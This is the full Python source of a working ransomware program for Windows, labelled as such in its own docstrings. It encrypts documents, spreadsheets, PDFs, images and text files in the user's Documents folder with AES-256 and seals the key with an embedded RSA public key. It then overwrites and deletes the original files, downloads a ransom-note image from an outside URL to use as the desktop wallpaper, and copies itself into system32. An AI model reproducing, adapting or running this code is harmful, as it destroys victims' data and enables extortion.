import os
import urllib.request
import ctypes
import glob
import shutil
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

def encrypt_key(key):
    """ Given a key, writes it in RSA encrypted file
    Args:
        key(bytes): key to encrypt
    """
    path = os.path.join(os.environ['USERPROFILE'], 'Desktop') + '\\key.encrypted'
    file = open(path, 'wb')
    pub_key = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyjyYKllMtF/vMyZ0zTBI\nNVPl8Z+6aCcj0cRuW1frrG6+G5twmb258PxF4PK9sKspXZM5D2IO3zb3bZb9GSvZ\n2UsvFURQwhtmBjKTcJcw80DoGLIhBGFndG6V9jT/4ekWT1XPnlTtuVF+Pz4xw2pb\neX/kwy0eH2aca5uHubrcqzp5UCxx9glUF1e5maiQy6Bl+xeFHC23MQmMq/nChnWr\nKQtbOAK5bDPPNbze6AWC05okPwjHgf2PkRBAFmlRxxYEHhwP9c8ccr+etkiu6HYW\nYCBV0aovObONuTLGOdIn8IYWz6Dfd2tww9ttGicu9ToIQFTCt2THPXKMKHQioEXd\nUwIDAQAB\n-----END PUBLIC KEY-----"
    public_key = serialization.load_pem_public_key(
        pub_key, 
        backend=default_backend())
    ciphertext = public_key.encrypt(
    key,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None))
    file.write(ciphertext)
    file.close()

def secure_delete(filepath):
    """ Overwrites the bytes of a file, then deletes it
    Args:
        filepath(string): Absolute path of the file
    """
    file = open(filepath, 'rb+')
    size = os.path.getsize(filepath)
    for _ in range (size):
        file.write(os.urandom(1))
    file.seek(0)    
    for _ in range(size):
        file.write(b'\x00')
    file.close()
    os.remove(filepath)  

def kidnap_file(filename, key):
    """ Given an AES key, encrypts the file and 
    appends '.encrypted' to the result
    Args:
        filename(string): Absolute path of the file
        key(bytes): AES-256 key for the encryption process
    """
    BUFFER_SIZE = 1024 * 1024
    iv = os.urandom(16)
    file_in = open(filename, 'rb')
    file_enc = open(filename + '.encrypted', 'wb')
    cipher = Cipher(
        algorithms.AES(key),
        modes.OFB(iv),
    )
    encryptor = cipher.encryptor()
    file_enc.write(iv)
    data = file_in.read(BUFFER_SIZE)
    while len(data):
        encrypted_data = encryptor.update(data)
        file_enc.write(encrypted_data)
        data = file_in.read(BUFFER_SIZE)
    file_enc.close()
    file_in.close()

def change_background():
    """ Retrieves an image with the ransom note from a Url which
    becomes the victim's desktop background
    """
    path = os.path.join(os.environ['USERPROFILE'], 'Downloads') + '\\untitled.png'
    imgurl = 'https://iili.io/2p8dPPn.png'
    urllib.request.urlretrieve(imgurl, path)
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

def copy_exec():
    """ Makes a copy of this program's executable file on the victim's 
    system32 folder"""
    origin = os.path.join(os.environ['USERPROFILE'], 'Downloads')
    origin += '\\ransomware.exe'
    destination = os.path.join(os.environ['WINDIR'], 'system32')
    destination += '\\ransomware.exe'
    shutil.copy(origin, destination)


def main():
    """ Ransomware program workflow:
    - Change victim's background
    - Make a copy of the exec on system32
    - Generate then encrypt AES-256 key with public RSA key
    - Encrypt with AES-256 and securely delete every file with the given extensions on
      the user's 'Documents' folder
    """
    change_background()
    copy_exec()
    key = AESGCM.generate_key(bit_length=256)
    encrypt_key(key)
    path = os.path.join(os.environ['USERPROFILE'], 'Documents')
    file_extensions = ['*.docx', '*.xlsx', '*.pdf', '*.jpeg', '*.jpg', '*.txt']
    for file_ext in file_extensions:
        for filename in glob.glob(os.path.join(path, file_ext)):
            kidnap_file(filename, key)
            secure_delete(filename)

if __name__ == "__main__":
    main()